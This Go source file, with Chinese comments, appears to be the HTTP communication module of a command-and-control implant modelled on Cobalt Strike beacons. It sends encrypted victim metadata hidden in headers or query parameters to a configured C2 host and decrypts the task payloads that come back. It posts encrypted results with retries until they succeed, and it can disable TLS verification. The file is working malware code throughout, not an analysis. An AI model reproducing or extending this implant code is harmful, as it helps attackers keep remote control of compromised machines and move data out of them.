package packet

import (
	"bytes"
	"crypto/tls"
	"errors"
	"github.com/imroc/req"
	"main/config"
	"main/util"
	"math/rand"
	"net/http"
	"os"
	"strconv"
)

var (
	httpRequest = req.New()
)

// init was called at beginning of the package
// init函数: 这是一个特殊的函数，它在Go框架加载包时自动执行。
// 它设置了HTTP请求的一些关键参数，如超时、代理URL、主机名，并使用这些参数配置HTTP请求客户端。
func init() {
	if !config.IsDNS {
		httpRequest.SetTimeout(config.TimeOut)
		if config.ProxyUrl != "" {
			err := httpRequest.SetProxyUrl(config.ProxyUrl)
			if err != nil {
				ErrorMessage(util.Sprintf("error proxy url: %s", config.ProxyUrl))
				// may not delete self?
				os.Exit(1)
			}
		}
		if config.HostName != "" {
			config.HttpHeaders["Host"] = config.HostName
		}
		trans, _ := httpRequest.Client().Transport.(*http.Transport)
		trans.MaxIdleConns = 20
		trans.TLSHandshakeTimeout = config.TimeOut
		trans.DisableKeepAlives = true
		trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: config.IgnoreSSLVerify}
	}
}

// HttpPost seems post response is no need to deal with
// need to handler c2profile here
// HttpPost函数: 这个函数主要用于发送HTTP POST请求。它首先对输入的数据进行加密，
// 然后根据配置将客户ID添加到查询参数或HTTP头部。再根据预置和后置的配置添加数据。最后，它反复发送HTTP请求，直到成功为止。
func HttpPost(data []byte) *req.Resp {
	data = util.EncryptField(config.PostClientDataEncryptType, data)

	var param req.QueryParam
	var header req.Header
	switch config.PostClientIDType {
	case "parameter":
		param = req.QueryParam{
			config.PostClientID: string(util.EncryptField(config.PostClientIDEncrypt, []byte(strconv.Itoa(clientID)))),
		}
	case "header":
		header = req.Header{
			config.PostClientID: string(util.EncryptField(config.PostClientIDEncrypt, []byte(strconv.Itoa(clientID)))),
		}
	}

	// add append and prepend,but it seems client don't need this
	data = append(data, []byte(config.PostClientAppend)...)
	data = append([]byte(config.PostClientPrepend), data...)

	// push result may need to continually send packets until success
	for {
		url := config.Host + config.PostUri[rand.Intn(len(config.PostUri))]
		resp, err := httpRequest.Post(url, data, config.HttpHeaders, header, param)
		if err != nil {
			util.Printf("!error: %v\n", err)
			util.Sleep()
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				// it seems nobody care about post result?
				return resp
			}
			break
		}
	}

	return nil
}

// HttpGet need to handler c2profile here, data is raw rsa encrypted meta info
// HttpGet函数: 这个函数用于发送HTTP GET请求。它首先将输入数据加密并添加到查询参数或HTTP头部，
// 然后发送请求。如果服务器返回了200状态码，它将处理服务器响应并返回有效载荷；否则，它将返回一个错误。
func HttpGet(data []byte) ([]byte, error) {
	buf := bytes.NewBuffer(data)
	stringData := string(util.EncryptField(config.GetMetaEncryptType, buf.Bytes()))
	stringData = config.GetClientPrepend + stringData + config.GetClientAppend

	httpHeaders := config.HttpHeaders
	var metaDataHeader req.Header
	var metaDataQuery req.QueryParam
	switch config.MetaDataFieldType {
	case "header":
		metaDataHeader = req.Header{config.MetaDataField: stringData}
	case "parameter":
		metaDataQuery = req.QueryParam{config.MetaDataField: stringData}
	}

	url := config.Host + config.GetUri[rand.Intn(len(config.GetUri))]

	// provide 2 header args is supported
	resp, err := httpRequest.Get(url, httpHeaders, metaDataHeader, metaDataQuery)
	// if error occurred, just wait for next time
	if err != nil {
		return nil, err
	} else {
		if resp.Response().StatusCode == http.StatusOK {
			payload, err := resolveServerResponse(resp)
			if err != nil {
				return nil, err
			}
			return payload, nil
		} else {
			return nil, errors.New("http status is not 200")
		}
	}
}

// extract payload
// resolveServerResponse函数: 这个函数根据请求的方法解析服务器响应。对于GET和POST请求，
// 它先去除前后的特定字符串，然后解密响应数据。如果请求方法既不是GET也不是POST，它将抛出一个异常。
func resolveServerResponse(res *req.Resp) ([]byte, error) {
	method := res.Request().Method
	// response body string
	data := res.Bytes()
	switch method {
	case "GET":
		data = bytes.TrimSuffix(bytes.TrimPrefix(data, []byte(config.GetServerPrepend)), []byte(config.GetServerAppend))
		var err error
		data, err = util.DecryptField(config.GetServerEncryptType, data)
		if err != nil {
			return nil, err
		}
	case "POST":
		data = bytes.TrimSuffix(bytes.TrimPrefix(data, []byte(config.PostServerPrepend)), []byte(config.PostServerAppend))
		var err error
		data, err = util.DecryptField(config.PostServerEncryptType, data)
		if err != nil {
			return nil, err
		}
	default:
		panic("invalid http method type " + method)
	}
	return data, nil
}
